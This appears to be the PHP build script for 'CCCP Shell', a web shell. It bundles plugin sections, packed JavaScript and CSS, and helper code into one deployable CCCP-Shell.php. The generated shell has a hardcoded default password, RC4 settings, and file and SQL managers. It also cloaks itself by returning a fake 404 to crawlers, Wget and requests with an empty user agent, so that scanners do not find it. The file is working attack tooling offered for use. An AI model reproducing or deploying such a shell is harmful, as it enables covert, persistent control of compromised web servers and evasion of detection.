<?php


$charset = 'utf-8';
$pass = 'cccpshell';





$baseFolder = dirname(__file__);
require "{$baseFolder}/includes/jsPacker.php";
require "{$baseFolder}/includes/tools.php";


require "{$baseFolder}/base/config.php";
$config['charset'] = $charset;
$config['sPass'] = md5($pass);
$config['rc4drop'] = mt_rand(23, 80);


//base files
$js  = file_get_contents("{$baseFolder}/base/base.js");
$css = file_get_contents("{$baseFolder}/base/base.css");


//sections
$menu = '';
$sections = '';
foreach (glob("{$baseFolder}/sections/*.php") as $path) {
    $info = pathinfo($path);
    $plugin = $info['filename'];
    $folder = "{$baseFolder}/sections/";
    $name = ucwords($plugin);
    $menu .= mLink("<b>{$name}</b>", 'ajaxLoad("me=' . $plugin . '")') . ' | ';

    //plugins
    $code = file_get_contents("{$folder}/{$plugin}.php");
    if (!empty($sections)) {
        $sections .= ' else ';
    }

    $sections .= "if (\$p['me'] === '{$plugin}') {
        {$code}
    }"; 

    if (file_exists("{$folder}/{$plugin}.js")) {
        $js .= file_get_contents("{$folder}/{$plugin}.js");
    }

    if (file_exists("{$folder}/{$plugin}.css")) {
        $css .= file_get_contents("{$folder}/{$plugin}.css");
    }
}


// termino de armar
$defAction = "filemanager' . (isset(\$p['dir']) ? '&dir=' . rawurlencode(\$p['dir']) : '') . '";
$menu .= mLink('<b>Logout</b>', 'if (confirm("Are you sure?")) {sessionStorage.clear();hash="";d.getElementsByTagName("html")[0].innerHTML="";}'); 
$js = 'var config = ' . json_encode($config) . ";\n" . $js;


// con esto arreglo el escapado en php y las secciones
$menu = str_replace("'", "\'", $menu);
$js = str_replace("'", "\'", $js);
$sections = str_replace('<?php', '', $sections);


// creo ultima seccion
$js = packer_pack_js($js);
$code = file_get_contents("{$baseFolder}/base/theme.php");
$code = str_replace(
    array('{{_JS_}}', '{{_CSS_}}', '{{_MENU_}}'), 
    array($js, $css, $menu), 
    $code
);

$sections .= " else if (\$p['me'] === 'loader') {
    \$defAction = 'ajaxLoad(\"me={$defAction}\")';
    \$loader = '{$code}';

    sAjax(\$loader);
}"; 


// termino de procesar el codigo php
$sections = packer_strips($sections);
$php = file_get_contents("{$baseFolder}/base/helpers.php");
$php .= file_get_contents("{$baseFolder}/base/zip.php");
$php = str_replace('<?php', '', $php);
$php = packer_strips($php);


// creo loader
$loaderJs = file_get_contents("{$baseFolder}/base/loader.js");
$loaderJs = packer_pack_js($loaderJs);
$loaderHtml = file_get_contents("{$baseFolder}/base/loader.php");
$loader = str_replace('{{_JS_}}', $loaderJs, $loaderHtml);


// se fini
$timestamp = date($config['datetime'], time());

$shell = "<?php
/*
 * CCCP Shell
 * by DSR!
 * https://github.com/xchwarze/CCCPShell
 * v 1.1.0 build: {$timestamp}
 */

# System variables
\$config['charset'] = '{$config['charset']}'; //'utf-8', 'big5', 'gbk', 'iso-8859-2', 'euc-kr', 'euc-jp'
\$config['date'] = '{$config['date']}';
\$config['datetime'] = '{$config['datetime']}';
\$config['hd_lines'] = {$config['hd_lines']};   //lines in hex preview file
\$config['hd_rows'] = {$config['hd_rows']};    //16, 24 or 32 bytes in one line
\$config['FMLimit'] = {$config['FMLimit']};   //file manager item limit. false = No limit
\$config['SQLLimit'] = {$config['SQLLimit']};   //sql manager result limit.
\$config['checkBDel'] = true;//Check Before Delete: true = On 
\$config['consNames'] = array('post'=>'dsr', 'slogin'=>'cccpshell', 'sqlclog'=>'conlog'); //Constants names
\$config['sPass'] = '{$config['sPass']}'; // md5(pass)
\$config['rc4drop'] = {$config['rc4drop']};  //drop size


// ------ Start CCCPShell
{$php}

\$sBuff = '';    
\$p = getData();


# Sections
if (isset(\$p['me'])) {
    {$sections}
}

#Se fini
if (isset(\$_SERVER['HTTP_X_REQUESTED_WITH']) && \$_SERVER['HTTP_X_REQUESTED_WITH'] === 'XMLHttpRequest') {
    sAjax(\$sBuff . mHide('etime', substr((microtime(true) - \$loadTime), 0, 4)));
    //sAjax(\$sBuff . mHide('etime', substr((microtime(true) - \$loadTime), 0, 4) . ' Mem Peak: ' . sizecount(memory_get_peak_usage(false)) . ' Men: ' . sizecount(memory_get_usage(false))) );
} else {
    \$uAgents = array('Google', 'Slurp', 'MSNBot', 'ia_archiver', 'Yandex', 'Rambler', 'Yahoo', 'Zeus', 'bot', 'Wget');
    if (empty(\$_SERVER['HTTP_USER_AGENT']) || preg_match('/' . implode('|', \$uAgents) . '/i', \$_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
?>
{$loader}";



//echo $shell;
file_put_contents("{$baseFolder}/CCCP-Shell.php", $shell);
echo 'Generation completed!';
